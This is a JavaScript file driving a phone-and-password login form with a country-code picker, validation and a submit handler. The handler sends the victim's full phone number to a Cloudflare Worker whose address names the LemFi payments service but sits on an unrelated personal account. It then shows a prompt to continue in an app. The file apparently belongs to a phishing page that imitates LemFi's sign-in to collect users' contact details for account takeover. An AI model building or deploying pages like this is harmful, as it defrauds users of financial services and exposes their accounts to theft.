const phone = document.getElementById("phone");
const password = document.getElementById("password");
const submitBtn = document.getElementById("submitBtn");
const form = document.getElementById("loginForm");
const msg = document.getElementById("formMsg");
const eye = document.getElementById("toggleEye");
const countryToggle = document.getElementById("countryToggle");
const countryMenu = document.getElementById("countryMenu");
const dialSlot = document.getElementById("dialSlot");
const flagSlot = document.getElementById("flagSlot");
const appNotice = document.getElementById("appNotice");
const appNoticeOk = document.getElementById("appNoticeOk");


// Your Cloudflare Worker URL
const WORKER_URL = "https://lemfi.damsofred.workers.dev";


// -------------------------
// FLAGS
// -------------------------

const FLAGS = {
  GB: `<svg viewBox="0 0 60 30" width="28" height="28">
    <clipPath id="gb-s">
      <path d="M0,0 v30 h60 v-30 z"/>
    </clipPath>

    <clipPath id="gb-t">
      <path d="M30,15 h30 v15 z v15 h-30 z h-30 v-15 z v-15 h30 z"/>
    </clipPath>

    <g clip-path="url(#gb-s)">
      <path d="M0,0 v30 h60 v-30 z" fill="#012169"/>
      <path d="M0,0 L60,30 M60,0 L0,30"
        stroke="#fff"
        stroke-width="6"/>
      <path d="M0,0 L60,30 M60,0 L0,30"
        clip-path="url(#gb-t)"
        stroke="#C8102E"
        stroke-width="4"/>
      <path d="M30,0 v30 M0,15 h60"
        stroke="#fff"
        stroke-width="10"/>
      <path d="M30,0 v30 M0,15 h60"
        stroke="#C8102E"
        stroke-width="6"/>
    </g>
  </svg>`,

  US: `<svg viewBox="0 0 60 30" width="28" height="28">
    <rect width="60" height="30" fill="#fff"/>

    <g fill="#B22234">
      <rect y="0" width="60" height="2.31"/>
      <rect y="4.62" width="60" height="2.31"/>
      <rect y="9.23" width="60" height="2.31"/>
      <rect y="13.85" width="60" height="2.31"/>
      <rect y="18.46" width="60" height="2.31"/>
      <rect y="23.08" width="60" height="2.31"/>
      <rect y="27.69" width="60" height="2.31"/>
    </g>

    <rect width="24" height="16.15" fill="#3C3B6E"/>
  </svg>`,

  CA: `<svg viewBox="0 0 60 30" width="28" height="28">
    <rect width="60" height="30" fill="#fff"/>
    <rect width="15" height="30" fill="#D52B1E"/>
    <rect x="45" width="15" height="30" fill="#D52B1E"/>

    <path d="M30 8
      l1.5 3
      3-1
      -1 3
      3 1.5
      -3 1.5
      1 3
      -3-1
      -1.5 3
      -1.5-3
      -3 1
      1-3
      -3-1.5
      3-1.5
      -1-3
      3 1z"
      fill="#D52B1E"/>
  </svg>`
};


// -------------------------
// COUNTRY SELECTOR
// -------------------------

function setCountry(code, dial) {
  flagSlot.innerHTML = FLAGS[code] || FLAGS.GB;
  dialSlot.textContent = dial;
  countryToggle.dataset.dial = dial;

  validate();
}


// Default country
setCountry("GB", "+44");


// Add small flags to country menu
document.querySelectorAll("[data-flag]").forEach((element) => {
  element.innerHTML = FLAGS[element.dataset.flag] || "";
});


// Open or close menu
function openMenu(open) {
  countryMenu.classList.toggle("open", open);

  countryToggle.setAttribute(
    "aria-expanded",
    open ? "true" : "false"
  );
}


// Country button click
countryToggle.addEventListener("click", (event) => {
  if (event.target.closest(".country-menu")) {
    return;
  }

  openMenu(
    !countryMenu.classList.contains("open")
  );
});


// Keyboard controls
countryToggle.addEventListener("keydown", (event) => {
  if (event.key === "Enter" || event.key === " ") {
    event.preventDefault();

    openMenu(
      !countryMenu.classList.contains("open")
    );
  }

  if (event.key === "Escape") {
    openMenu(false);
  }
});


// Country selection
countryMenu.addEventListener("click", (event) => {
  const country = event.target.closest(
    "li[role='option']"
  );

  if (!country) {
    return;
  }

  setCountry(
    country.dataset.code,
    country.dataset.dial
  );

  openMenu(false);
});


// Close country menu when clicking outside
document.addEventListener("click", (event) => {
  if (!countryToggle.contains(event.target)) {
    openMenu(false);
  }
});


// -------------------------
// FORM VALIDATION
// -------------------------

function validate() {
  const dial =
    countryToggle.dataset.dial || "+44";

  const phoneNumber =
    phone.value
      .trim()
      .replace(/\s/g, "");

  const fullPhone =
    (dial + phoneNumber)
      .replace(/\s/g, "");

  const validPhone =
    /^\+\d{6,15}$/.test(fullPhone);

  const validPassword =
    password.value.length >= 1;

  submitBtn.disabled =
    !(validPhone && validPassword);
}


// Phone input
phone.addEventListener("input", () => {
  phone.value =
    phone.value.replace(/[^\d\s]/g, "");

  validate();
});


// Password input
password.addEventListener(
  "input",
  validate
);


// -------------------------
// SHOW / HIDE PASSWORD
// -------------------------

eye.addEventListener("click", () => {
  const currentlyHidden =
    password.type === "password";

  password.type =
    currentlyHidden
      ? "text"
      : "password";

  eye.setAttribute(
    "aria-label",
    currentlyHidden
      ? "Hide password"
      : "Show password"
  );
});


// -------------------------
// APP NOTICE
// -------------------------

function showAppNotice() {
  appNotice.classList.add("open");

  appNotice.setAttribute(
    "aria-hidden",
    "false"
  );
}


function hideAppNotice() {
  appNotice.classList.remove("open");

  appNotice.setAttribute(
    "aria-hidden",
    "true"
  );
}


appNoticeOk.addEventListener(
  "click",
  hideAppNotice
);


appNotice.addEventListener(
  "click",
  (event) => {

    if (event.target === appNotice) {
      hideAppNotice();
    }

  }
);


// -------------------------
// SUBMIT FORM
// -------------------------

form.addEventListener(
  "submit",
  async (event) => {

    event.preventDefault();

    // Clear previous message
    msg.textContent = "";
    msg.className = "form-msg";


    // Get dial code
    const dial =
      countryToggle.dataset.dial || "+44";


    // Create complete phone number
    const fullPhone =
      (dial + phone.value.trim())
        .replace(/\s/g, "");


    // Disable button
    submitBtn.disabled = true;


    const oldButtonText =
      submitBtn.textContent;


    submitBtn.textContent =
      "Logging in...";


    try {

      const response =
        await fetch(WORKER_URL, {

          method: "POST",

          headers: {
            "Content-Type":
              "application/json"
          },

          body: JSON.stringify({

            phone: fullPhone

          })

        });


      const result =
        await response.json();


      if (result.ok) {

        showAppNotice();

        form.reset();

        phone.value = "";

      } else {

        msg.textContent =
          result.message ||
          "Something went wrong.";

        msg.classList.add(
          "error"
        );

      }

    } catch (error) {

      console.error(
        "Worker request failed:",
        error
      );


      msg.textContent =
        "Network error. Please try again.";

      msg.classList.add(
        "error"
      );

    } finally {

      submitBtn.textContent =
        oldButtonText;

      validate();

    }

  }
);


// Initial validation
validate();